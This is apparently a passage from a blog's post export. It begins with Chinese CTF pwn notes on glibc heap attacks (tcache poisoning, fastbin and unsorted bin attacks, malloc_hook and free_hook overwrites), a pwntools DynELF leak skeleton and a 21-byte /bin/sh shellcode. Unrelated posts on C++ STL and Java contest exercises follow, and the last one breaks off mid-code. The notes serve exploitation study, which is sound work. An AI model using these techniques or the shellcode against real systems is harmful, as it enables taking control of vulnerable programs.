<h4 id="篡改fd指针"><a href="#篡改fd指针" class="headerlink" title="篡改fd指针"></a>篡改fd指针</h4><h5 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h5><p>就是fd控制，那么它指向的地址（要被认为是一个chunk，可以通过size域的检查）</p>
<h5 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h5><p>2.27里面加入的，更快</p>
<p>但是从堆块去内存的时候，没有对size进行检查（不知道地址是否合法）</p>
<p>attack：</p>
<h6 id="篡改fd指针-1"><a href="#篡改fd指针-1" class="headerlink" title="篡改fd指针"></a>篡改fd指针</h6><h6 id="tcache-struct-attack"><a href="#tcache-struct-attack" class="headerlink" title="tcache struct attack"></a>tcache struct attack</h6><p>tcache_struct:</p>
<ul>
<li>tcache_count;</li>
<li>tcache_entry;</li>
</ul>
<p>attack：篡改tcache_entry-&gt;任意地址分配</p>
<h5 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h5><h4 id="篡改bk指针"><a href="#篡改bk指针" class="headerlink" title="篡改bk指针"></a>篡改bk指针</h4><h5 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h5><p>向地址里面写入libc</p>
<p>bk = target - 0x10（64位）</p>
<p>不良影响：unsortedbin被污染，用它分配内存可能有错</p>
<h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>在64位下是0x7f开头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">system&#x3D;libc_base+libc.symbols[&quot;system&quot;]</span><br><span class="line">bin_sh&#x3D;libc_base+libc.search(&quot;&#x2F;bin&#x2F;sh&quot;).next()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如果题目中给出了libc文件，用ida打开，搜索字符串，搜索version<img src="/2020/11/07/23-39/Users\YCNN\Desktop\ctf 2020\ctf wiki刷题\ctf wiki的刷题笔记\image-20201108030310873.png" alt="image-20201108030310873"></p>
</li>
<li><p>如果题目没有给出libc文件，需要一个个尝试</p>
<ul>
<li><p>堆的话试试UAF啥的</p>
<p>​    要么2.23、要么2.27、2.31就喷他</p>
</li>
<li><p>栈溢出那就leak一下就行了</p>
</li>
</ul>
</li>
</ul>
<h4 id="题目给定"><a href="#题目给定" class="headerlink" title="题目给定"></a>题目给定</h4><p><strong>查看版本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings libc.so | grep GNU</span><br></pre></td></tr></table></figure>
<p>查看该版本与本地是否相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff libc.so &#x2F;lib&#x2F;x86..&#x2F;libc-2.27.so</span><br></pre></td></tr></table></figure>
<p><code>Binary files libc-2.27.so and /lib/x86_64-linux-gnu/libc-2.27.so differ</code></p>
<p>表示该libc与本地环境不同，故调试的时候，需要加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">io &#x3D; process([&#39;.&#x2F;bin&#39;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.23.so&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p>来加载，其中[‘./bin’]替换为你需要调试的二进制文件名，”./libc-2.23.so”替换成你需要加载的目标libc，这样本地调试就可以通过目标libc进行了。</p>
<h3 id="寄存器参数"><a href="#寄存器参数" class="headerlink" title="寄存器参数"></a>寄存器参数</h3><p>%rdi, %rsi, %rdx, %rcx, %r8, %r9 </p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>进入容器的几种方法：<br>    1、exec<br>      通过docker ps 查看需要进入的容器pid<br>      执行<br>        docker exec -it 246f35c432de /bin/bash<br>      退出容器，不会关闭容器，一般使用这个方法。<br>    2、attach<br>      通过docker ps 查看需要进入的容器pid<br>      docker attach pid<br>      退出容器会关闭容器，不推荐</p>
<p>Docker进入容器的几种方法：<a href="https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf</a></p>
<h3 id="pwn出题环境"><a href="#pwn出题环境" class="headerlink" title="pwn出题环境"></a>pwn出题环境</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
<h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;xxx&#39;)</span><br><span class="line">def leak(address):</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload &#x3D; &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data &#x3D; p.recv(4)</span><br><span class="line">  log.debug(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;ELF(&quot;.&#x2F;xxx&quot;))      #初始化DynELF模块 </span><br><span class="line">systemAddress &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure>
<p>addr就是可以泄漏内存的地址</p>
<p>比如说write函数和put函数的输出参数</p>
<h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。</p>
<h3 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global max fast"></a>global max fast</h3><p>global max fast是决定使用fast bin管理的chunk的最大值</p>
<p>使用：</p>
<p>改写global max fast后，处理特定大小的chunk，进而可以在arena往后的任意地址写入一个堆地址</p>
<h3 id="markdown的页内跳转"><a href="#markdown的页内跳转" class="headerlink" title="markdown的页内跳转"></a>markdown的页内跳转</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 先定义一个锚(id)</span><br><span class="line">	&lt;span id=<span class="string">"jump"</span>&gt;Hello World&lt;/span&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">2.</span> 然后使用markdown的语法:</span><br><span class="line">	[<span class="meta">XXXX</span>](<span class="meta">#jump)</span></span><br></pre></td></tr></table></figure>
<h3 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h3><p>开头</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br></pre></td></tr></table></figure>
<h4 id="elf和libc区别"><a href="#elf和libc区别" class="headerlink" title="elf和libc区别"></a>elf和libc区别</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;onetime&#39;)</span><br></pre></td></tr></table></figure>
<p>got和plt是程序的，也就是ELF(‘./程序’)</p>
<p>symbols是libc的，也就是ELF(‘./libc文件’)</p>
<h4 id="接收字符串"><a href="#接收字符串" class="headerlink" title="接收字符串"></a>接收字符串</h4><h5 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;\x7f&quot;)[-6:]</span><br><span class="line">canary &#x3D; &#39;\x00&#39; + p.recv(7)#这个是栈溢出泄漏的canary</span><br></pre></td></tr></table></figure>
<h5 id="show得到的"><a href="#show得到的" class="headerlink" title="show得到的"></a>show得到的</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>system(‘sh’)也可以得到shell</p>
<p><img src="/2020/11/07/23-39/image-20201109192504900.png" alt="image-20201109192504900"></p>
<h3 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h3><p>注意plt表可执行不可写，got表可写不可读：</p>
<p><img src="/2020/11/07/23-39/image-20201109192029254.png" alt="image-20201109192029254"></p>
<p>ptl表的地址：0x400620 - 0x4006C0附近</p>
<p><img src="/2020/11/07/23-39/image-20201109192144499.png" alt="image-20201109192144499"></p>
<p>got表地址在0x602000 - 0x602060</p>
<p><img src="/2020/11/07/23-39/image-20201109192315003.png" alt="image-20201109192315003"></p>
<ul>
<li><strong>.got</strong></li>
</ul>
<p>GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。</p>
<ul>
<li><strong>.plt</strong></li>
</ul>
<p>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</p>
<ul>
<li><strong>.got.plt</strong></li>
</ul>
<p>这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述  PLT 表所需地址（已经找到的和需要去触发的）</p>
<h3 id="可控内存"><a href="#可控内存" class="headerlink" title="可控内存"></a>可控内存</h3><ul>
<li>bss段：进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
<li>heap：需要泄漏堆地址</li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pwntools提供的</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#21字节的shellcode</span></span><br><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br></pre></td></tr></table></figure>
<h3 id="ljust"><a href="#ljust" class="headerlink" title="ljust"></a>ljust</h3><p>前面是大小，后面是填充的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload.ljust(0x100+0x8, &quot;a&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>~/ctf-challenges/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w</p>
<h3 id="更新源和软件"><a href="#更新源和软件" class="headerlink" title="更新源和软件"></a>更新源和软件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update      #更新源</span><br><span class="line">sudo apt-get upgrade     #更新软件</span><br></pre></td></tr></table></figure>
<h3 id="main-arena-offset"><a href="#main-arena-offset" class="headerlink" title="main_arena_offset"></a>main_arena_offset</h3><p>使用如下工具：</p>
<p><a href="https://github.com/Coldwave96/LibcOffset" target="_blank" rel="noopener">https://github.com/Coldwave96/LibcOffset</a></p>
<p><img src="/2020/11/07/23-39/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201119001634875.png" alt="image-20201119001634875"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc_base &#x3D; main_arena - main_arena_offset</span><br></pre></td></tr></table></figure>
<h3 id="offset-unsortedbin-main-arena"><a href="#offset-unsortedbin-main-arena" class="headerlink" title="offset_unsortedbin_main_arena"></a>offset_unsortedbin_main_arena</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.binary = <span class="string">"./babyheap_0ctf_2017"</span><span class="comment">#要指定</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line">offset_unsortedbin_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main_arena &#x3D; unsortedbin_addr - offset_unsortedbin_main_arena</span><br></pre></td></tr></table></figure>
<h3 id="allocate"><a href="#allocate" class="headerlink" title="allocate"></a>allocate</h3><h4 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h4><p>calloc同malloc类似只是会将申请到的堆块内容清0。所以常规的unsorted bin信息泄露的方式不可行。需要使用堆溢出进行配合</p>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><h4 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h4><p>最常见也是最容易的一种堆利用方法。<br>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转<br>通过fastbin_attack攻击malloc_hook。</p>
<p>fastbin在分配时并不检查对齐情况，将fastbin的fd设置为__malloc_hook-0x23，触发fastbin attack分配得到malloc_hook上方内存空间，向malloc_hook进行写入one_gadget得到权限。</p>
<h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h4><p>一种很巧妙的利用方法。有些情况下<strong>one_gadget</strong>因为环境原因全部都不可用，这时可以通过<strong>realloc_hook</strong>来<strong>调整堆栈环境</strong>使one_gadget可用。<br>realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。<br>realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。</p>
<h4 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h4><p>同malloc_hook类似，在调用free函数时会先检验free_hook的值。<br>但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以通过修改top<br>free_hook上方，之后申请内存至free_hook修改为system地址。<br>fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头</p>
<p><a href="https://bbs.pediy.com/thread-246786.htm#msg_header_h1_0" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm#msg_header_h1_0</a></p>
<h3 id="tcache-attack-1"><a href="#tcache-attack-1" class="headerlink" title="　tcache attack"></a>　tcache attack</h3><h4 id="内存申请："><a href="#内存申请：" class="headerlink" title="内存申请："></a>内存申请：</h4><p>在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。</p>
<p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p>
<p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p>
<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p>
<h4 id="tcache-取出"><a href="#tcache-取出" class="headerlink" title="tcache 取出"></a>tcache 取出</h4><p>在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。</p>
<h4 id="tcache-posioning"><a href="#tcache-posioning" class="headerlink" title="tcache posioning"></a>tcache posioning</h4><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<p>可以看出 <code>tcache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
<h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>可以对同一个 chunk 多次 free</p>
<h3 id="查看ubuntu版本"><a href="#查看ubuntu版本" class="headerlink" title="查看ubuntu版本"></a>查看ubuntu版本</h3><ol>
<li>cat /proc/version</li>
<li>uname -a</li>
<li>lsb_release -a</li>
</ol>
<h3 id="ropgadget"><a href="#ropgadget" class="headerlink" title="ropgadget"></a>ropgadget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop -- ropchain		#静态寻找rop链</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;		#寻找binsh字符串</span><br><span class="line"></span><br><span class="line">ROPgadget --binary calc --only &quot;pop|ret&quot; | grep &quot;ebx&quot;	#寻找指定寄存器</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>算法之数据结构篇</title>
    <url>/2021/04/18/14-41/</url>
    <content><![CDATA[<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><h3 id="插入"><a href="#插入" class="headerlink" title="　插入"></a>　插入</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">push_back();</span><br></pre></td></tr></table></figure>
<h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><blockquote>
<p>内部采用的是hash表结构,拥有快速检索的功能。 </p>
</blockquote>
<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers) ++<span class="built_in">map</span>[k];</span><br></pre></td></tr></table></figure>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><blockquote>
<p>sort两个参数，分别是数组的起始位置和终止位置。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort(begin, end)</span><br></pre></td></tr></table></figure>
<h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><blockquote>
<p>其中：前面的需要指定类型，：后面的直接填就行，这里是vector类型的数据</p>
<p>这里val是numbers变量里面的值。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(const int val:numbers)</span><br><span class="line">	++mp[val];</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>蓝桥杯入门训练</title>
    <url>/2021/01/09/12-21/</url>
    <content><![CDATA[<blockquote>
<p>入门训练：<a href="http://lx.lanqiao.cn/problemset.page?code=BEGIN-&amp;userid=363463" target="_blank" rel="noopener">http://lx.lanqiao.cn/problemset.page?code=BEGIN-&amp;userid=363463</a></p>
</blockquote>
<h2 id="Fibonacci数列"><a href="#Fibonacci数列" class="headerlink" title="Fibonacci数列"></a>Fibonacci数列</h2><blockquote>
<p>Fibonacci数列加上求余%</p>
<p>使用递归会超时，故大数组+循环</p>
</blockquote>
<h3 id="提交格式"><a href="#提交格式" class="headerlink" title="提交格式"></a>提交格式</h3><ul>
<li>不需要package，需要import</li>
<li>修改类名为Main</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);<span class="comment">//输入类</span></span><br><span class="line">		<span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];<span class="comment">//申请大数组</span></span><br><span class="line">		<span class="keyword">int</span> num = scan.nextInt();<span class="comment">//输入</span></span><br><span class="line">		</span><br><span class="line">		arr[<span class="number">1</span>] = <span class="number">1</span>;<span class="comment">//初始条件</span></span><br><span class="line">		arr[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=num;i++) &#123;</span><br><span class="line">			arr[i] = (arr[i-<span class="number">1</span>] + arr[i-<span class="number">2</span>])%<span class="number">10007</span>;<span class="comment">//循环计算每一项</span></span><br><span class="line"><span class="comment">//			System.out.print("arr[i]"+arr[i]);</span></span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">		System.out.print(arr[num]);<span class="comment">//输出结果</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里数组从1开始是有效的</p>
<h2 id="圆的面积"><a href="#圆的面积" class="headerlink" title="圆的面积"></a>圆的面积</h2><blockquote>
<p>pi * (r ^ 2)</p>
<ol>
<li>学习保留位数的输出</li>
<li>使用默认的Math类</li>
</ol>
</blockquote>
<h3 id="保留位数"><a href="#保留位数" class="headerlink" title="保留位数"></a>保留位数</h3><p>printf函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%.7f"</span>,result);</span><br></pre></td></tr></table></figure>
<h3 id="PI"><a href="#PI" class="headerlink" title="PI"></a>PI</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Math.PI</span><br></pre></td></tr></table></figure>
<h3 id="幂次"><a href="#幂次" class="headerlink" title="幂次"></a>幂次</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Math.pow(<span class="number">2</span>, <span class="number">3</span>);[底数，幂次]</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">circle_new_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> r = scan.nextInt();</span><br><span class="line">		<span class="keyword">double</span> result = Math.PI * r * r;</span><br><span class="line">		System.out.printf(<span class="string">"%.7f"</span>,result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="序列求和"><a href="#序列求和" class="headerlink" title="序列求和"></a>序列求和</h2><blockquote>
<p>1+2+3+…+n = n * (n-1) /2</p>
<ol>
<li>学会简化给定的信息</li>
<li>注意数据规模，适当将int用long替代</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Seq_second_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();<span class="comment">//输入</span></span><br><span class="line">		<span class="keyword">long</span> result = n * (n+<span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//简化的式子</span></span><br><span class="line">		System.out.print(result);<span class="comment">//输出</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="A-B问题"><a href="#A-B问题" class="headerlink" title="A+B问题"></a>A+B问题</h2><blockquote>
<p>好像反着了，无所谓了，</p>
<p>很简单，但是之前的输入的进化不能同时用，不然new 两个Scanner对象出来，有点问题</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Plus_new_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">//		int a = new Scanner(System.in).nextInt();</span></span><br><span class="line"><span class="comment">//		int b = new Scanner(System.in).nextInt();</span></span><br><span class="line">		<span class="keyword">int</span> a = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> b = scan.nextInt();</span><br><span class="line">		System.out.print(a+b);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="useful信息"><a href="#useful信息" class="headerlink" title="useful信息"></a>useful信息</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ol>
<li>打印main+alt+/：main开头</li>
<li>ctrl+shift+o：自动引包</li>
<li>alt+shift+x：自动执行</li>
<li>打印syso+alt+/</li>
<li>for补全：for+alt+/</li>
<li>选中光标前面的后者后面的：shift+&lt;-(or -&gt;)</li>
<li>表达式变</li>
<li>函数的注释：alt+shift+j</li>
<li>文件夹重命名：F2</li>
</ol>
<h3 id="输入的进化"><a href="#输入的进化" class="headerlink" title="输入的进化"></a>输入的进化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>团体程序设计天梯赛-练习集</title>
    <url>/2021/03/19/10-59/</url>
    <content><![CDATA[<p>链接：<a href="https://pintia.cn/problem-sets/994805046380707840/problems/type/7" target="_blank" rel="noopener">团体程序设计天梯赛-练习集</a></p>
<h2 id="L1-006-连续因子"><a href="#L1-006-连续因子" class="headerlink" title="L1-006 连续因子"></a>L1-006 连续因子</h2><h3 id="序列最长长度"><a href="#序列最长长度" class="headerlink" title="序列最长长度"></a>序列最长长度</h3><p>因为n的取值范围：</p>
<p><img src="/2021/03/19/10-59/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319111256733.png" alt="image-20210319111256733"></p>
<p>又因为最长序列为2×3×。。。n，也就是n的阶乘。</p>
<p>计算n的最长序列</p>
<p>发现13!&gt;n最大值，12!&lt;n的最大值，，，，又因为1不算，，，也就是2×3×…13也就是最长为12位。。。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">13</span> ; ++i) &#123;</span><br><span class="line">        ans *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span 